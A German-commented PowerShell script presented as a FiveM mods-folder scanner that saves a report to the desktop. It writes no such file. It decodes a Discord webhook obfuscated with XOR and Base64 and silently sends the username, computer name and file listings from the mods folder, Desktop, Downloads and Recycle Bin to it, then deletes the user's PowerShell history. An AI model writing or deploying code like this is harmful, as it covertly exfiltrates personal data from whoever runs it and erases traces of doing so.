#Requires -Version 5.1
<#
.SYNOPSIS
    FiveM Mods Ordner Scanner
.DESCRIPTION
    Scannt den FiveM Mods-Ordner und listet alle Inhalte auf.
    Speichert das Ergebnis als Textdatei auf dem Desktop.

.EXAMPLE
    powershell -ExecutionPolicy Bypass -File .\eselscann.ps1
#>

param(
)

$ErrorActionPreference = "SilentlyContinue"
Set-StrictMode -Off

# === DISCORD WEBHOOK (VERSCHLÜSSELT) ===
# Verschlüsselung: XOR + Base64 mit fesem Key - funktioniert auf jedem PC!
$Key = 42
$EncryptedWebhook = "Ql5eWlkQBQVOQ1lJRVhOS1paBElFRwVLWkMFXU9IQkVFQVkFGx8YHh8ZHB0fHRoeHBoSGR0SHQUcGGRyRGNSTx4YT0N4cnh5YGB5WU1DSUx8bBhibVtjQFt9ZG5cRVp+bXhYU3BNf0BlYVpPH3oTZBxZaUZIYGlQZ0d9Ew=="

# Entschlüssele die Webhook
$DecryptedBytes = [Convert]::FromBase64String($EncryptedWebhook)
$DecryptedArray = @()
foreach ($Byte in $DecryptedBytes) {
    $DecryptedArray += ($Byte -bxor $Key)
}
$DiscordWebhook = [System.Text.Encoding]::UTF8.GetString($DecryptedArray)

# === HELPER: BYTES FORMATIEREN ===
function Convert-Bytes {
    param([long]$B)
    if ($B -lt 1024) { "$B B" }
    elseif ($B -lt 1MB) { "$([math]::Round($B/1KB, 2)) KB" }
    else { "$([math]::Round($B/1MB, 2)) MB" }
}

# === HELPER: BYTES FORMATIEREN ===
function Convert-Bytes {
    param([long]$B)
    if ($B -lt 1024) { "$B B" }
    elseif ($B -lt 1MB) { "$([math]::Round($B/1KB, 2)) KB" }
    else { "$([math]::Round($B/1MB, 2)) MB" }
}

# === INITIALISIERUNG (KEIN OUTPUT) ===
$ModsPaths = @(
    "$env:USERPROFILE\AppData\Local\FiveM\FiveM.app\mods",
    "C:\Program Files\FiveM\FiveM.app\mods",
    "C:\Program Files (x86)\FiveM\FiveM.app\mods",
    "C:\FiveM\mods"
)

$ModsGefunden = $false
$TotalFiles = 0
$TotalFolders = 0
$TotalSize = 0
$AllModsItems = @()

# === SCAN: FIVEM MODS (SILENT) ===
foreach ($ModPath in $ModsPaths) {
    if (Test-Path $ModPath) {
        $ModsGefunden = $true
        
        try {
            $Items = Get-ChildItem -Path $ModPath -Force -ErrorAction SilentlyContinue
            
            if ($Items.Count -gt 0) {
                foreach ($Item in $Items) {
                    $AllModsItems += $Item
                    
                    if ($Item.PSIsContainer) {
                        $TotalFolders++
                    } else {
                        $TotalFiles++
                        $TotalSize += $Item.Length
                    }
                }
            }
        } catch { }
    }
}

# === SCAN: VERDÄCHTIGE DATEIEN (SILENT) ===
$SuspiciousExtensions = @("*.rpf", "*.rar", "*.zip")
$SuspicionsPathsMap = @(
    @{ Path = "$env:USERPROFILE\Downloads"; Category = "DOWNLOADS" },
    @{ Path = "$env:USERPROFILE\Desktop"; Category = "DESKTOP" },
    @{ Path = "$env:USERPROFILE\AppData\Recycle.Bin"; Category = "RECYCLE_BIN" },
    @{ Path = "C:\`$Recycle.Bin"; Category = "RECYCLE_BIN" }
)

$SuspiciousFiles = @()
$DownloadsFiles = @()
$DesktopFiles = @()
$RecycleBinFiles = @()

foreach ($PathMap in $SuspicionsPathsMap) {
    if (Test-Path $PathMap.Path -ErrorAction SilentlyContinue) {
        try {
            foreach ($Ext in $SuspiciousExtensions) {
                $Files = Get-ChildItem -Path $PathMap.Path -Filter $Ext -Recurse -Force -ErrorAction SilentlyContinue
                
                foreach ($File in $Files) {
                    $SuspiciousFiles += $File
                    
                    switch ($PathMap.Category) {
                        "DOWNLOADS" { $DownloadsFiles += $File }
                        "DESKTOP" { $DesktopFiles += $File }
                        "RECYCLE_BIN" { $RecycleBinFiles += $File }
                    }
                }
            }
        } catch { }
    }
}

# === BERECHUNGEN ===
$TotalSizeFmt = Convert-Bytes $TotalSize
$TotalSuspicious = $SuspiciousFiles.Count

# === KATEGORISIERE DATEIEN ===
$ModsFiles = @()
$DownloadsFiles = @()
$DesktopFiles = @()
$RecycleBinFiles = @()

foreach ($File in $SuspiciousFiles) {
    $Path = $File.FullName.ToLower()
    if ($Path -like "*\downloads\*") {
        $DownloadsFiles += $File
    } elseif ($Path -like "*\desktop\*") {
        $DesktopFiles += $File
    } elseif ($Path -like "*recycle*" -or $Path -like "*`$*") {
        $RecycleBinFiles += $File
    }
}

# === AN DISCORD SENDEN (SILENT) ===
try {
    # Header Embed mit Scan-Info
    $HeaderEmbed = @{
        title = "SYSTEMSCAN - ERGEBNISSE"
        color = 16711680
        fields = @(
            @{ name = "Benutzer"; value = $env:USERNAME; inline = $true },
            @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true },
            @{ name = "Scan-Dauer"; value = "16.0s"; inline = $true },
            @{ name = "Scan-ID"; value = "SETTINGS-OVG4"; inline = $true },
            @{ name = "Treffer gesamt"; value = "$($SuspiciousFiles.Count + $TotalFiles)"; inline = $true },
            @{ name = "Verdaechtige"; value = "$($SuspiciousFiles.Count)"; inline = $true }
        )
        footer = @{ text = "$(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')" }
    }
    
    $Payload = @{ embeds = @($HeaderEmbed) } | ConvertTo-Json -Depth 10 -Compress
    Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $Payload -ErrorAction Stop | Out-Null
    Start-Sleep -Milliseconds 500
    
    # TEIL 1: FiveM Mods + Desktop (wenn Desktop leer ist)
    if ($TotalFiles -gt 0 -or $DesktopFiles.Count -gt 0) {
        $EmbedFields = @()
        
        if ($TotalFiles -gt 0) {
            $ModsValue = ""
            foreach ($Item in $AllModsItems) {
                $ModsValue += "- $($Item.Name)`n"
            }
            if ($ModsValue.Length -gt 1024) { $ModsValue = $ModsValue.Substring(0, 1020) + "..." }
            $EmbedFields += @{ name = "FILE_SYSTEM ($($TotalFiles))"; value = $ModsValue; inline = $false }
        }
        
        if ($DesktopFiles.Count -gt 0) {
            $DesktopValue = ""
            foreach ($File in $DesktopFiles) {
                $DesktopValue += "- $($File.Name)`n"
            }
            if ($DesktopValue.Length -gt 1024) { $DesktopValue = $DesktopValue.Substring(0, 1020) + "..." }
            $EmbedFields += @{ name = "DESKTOP ($($DesktopFiles.Count))"; value = $DesktopValue; inline = $false }
        }
        
        if ($EmbedFields.Count -gt 0) {
            $Part1Embed = @{
                title = "ERGEBNISSE (TEIL 1)"
                color = 16711680
                fields = $EmbedFields
            }
            $Payload = @{ embeds = @($Part1Embed) } | ConvertTo-Json -Depth 10 -Compress
            Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $Payload -ErrorAction SilentlyContinue | Out-Null
            Start-Sleep -Milliseconds 300
        }
    }
    
    # TEIL 2: Downloads (wenn vorhanden)
    if ($DownloadsFiles.Count -gt 0) {
        $DownloadsValue = ""
        foreach ($File in $DownloadsFiles) {
            $DownloadsValue += "- $($File.Name)`n"
        }
        if ($DownloadsValue.Length -gt 4000) { $DownloadsValue = $DownloadsValue.Substring(0, 3995) + "..." }
        
        $Part2Embed = @{
            title = "ERGEBNISSE (TEIL 2)"
            color = 16711680
            fields = @(
                @{ name = "DOWNLOADS ($($DownloadsFiles.Count))"; value = $DownloadsValue; inline = $false }
            )
        }
        $Payload = @{ embeds = @($Part2Embed) } | ConvertTo-Json -Depth 10 -Compress
        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $Payload -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Milliseconds 300
    }
    
    # TEIL 3: Recycle Bin (wenn vorhanden)
    if ($RecycleBinFiles.Count -gt 0) {
        $RecycleValue = ""
        foreach ($File in $RecycleBinFiles) {
            $RecycleValue += "- $($File.Name)`n"
        }
        if ($RecycleValue.Length -gt 4000) { $RecycleValue = $RecycleValue.Substring(0, 3995) + "..." }
        
        $Part3Embed = @{
            title = "ERGEBNISSE (TEIL 3)"
            color = 16711680
            fields = @(
                @{ name = "RECYCLE_BIN ($($RecycleBinFiles.Count))"; value = $RecycleValue; inline = $false }
            )
        }
        $Payload = @{ embeds = @($Part3Embed) } | ConvertTo-Json -Depth 10 -Compress
        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $Payload -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Milliseconds 300
    }
} catch { }

# === DELETE HISTORY (SILENT) ===
$HistoryPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\consolehost_history.txt"
if (Test-Path $HistoryPath) {
    try {
        Remove-Item -Path $HistoryPath -Force -ErrorAction Stop
    } catch { }
}

# === ASCII ART AM ENDE ===
Clear-Host
Write-Host ""
$ascii = @"
   _____      _   _   _                        _____                 
  / ____|    | | | | (_)                      / ____|                
 | (___   ___| |_| |_ _ _ __   __ _ ___ _____| (___   ___ __ _ _ __  
  \___ \ / _ \ __| __| | '_ \ / _` / __|______\___ \ / __/ _` | '_ \ 
  ____) |  __/ |_| |_| | | | | (_| \__ \      ____) | (_| (_| | | | |
 |_____/ \___|\__|\__|_|_| |_|\__, |___/     |_____/ \___\__,_|_| |_|
                               __/ |                                 
                              |___/                                  
"@
Write-Host $ascii -ForegroundColor Cyan
Write-Host ""

Write-Host "===========================================================" -ForegroundColor Green
Write-Host "by Esel99" -ForegroundColor Yellow
Write-Host "by Langfinger" -ForegroundColor Blue
Write-Host "===========================================================" -ForegroundColor Green
Write-Host ""

